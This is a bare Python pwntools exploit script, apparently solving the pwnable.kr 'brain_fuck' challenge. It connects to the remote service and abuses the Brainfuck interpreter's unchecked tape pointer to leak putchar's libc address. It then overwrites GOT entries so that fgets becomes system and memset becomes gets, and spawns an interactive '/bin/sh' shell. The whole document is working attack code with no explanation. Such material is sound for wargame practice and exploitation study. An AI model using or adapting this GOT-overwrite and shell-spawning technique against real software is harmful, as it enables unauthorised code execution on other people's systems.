from pwn import *

libc=ELF('/home/etenal/pwnable.kr/brain_fuck/bf_libc.so')
p=remote('pwnable.kr','9001')
print (p.recvline_startswith('type'))
payload='<'*(0x0804a0a0-0x0804a030)
payload=payload+'.'+'.>'*4+'<'*4+',>'*4  #memset-> gets
payload=payload+'<'*(0x0804a030+4-0x0804a02c)
payload=payload+',>'*4  #fgets -> system
payload=payload+'<'*(0x0804a02c+4-0x0804a010)+',>'*4+'.'


p.sendline(payload)
p.recvn(1) #GOT relocate
addr_putchar=p.recvn(4)[::-1].encode('hex')

addr_system=int(addr_putchar,16)-libc.symbols['putchar']+libc.symbols['system'];
addr_gets=int(addr_putchar,16)-libc.symbols['putchar']+libc.symbols['gets']
addr_start=0x080484e0

p.send(p32(addr_start))
p.send(p32(addr_gets))
p.send(p32(addr_system))
p.sendline('/bin/sh\x00')
p.interactive()
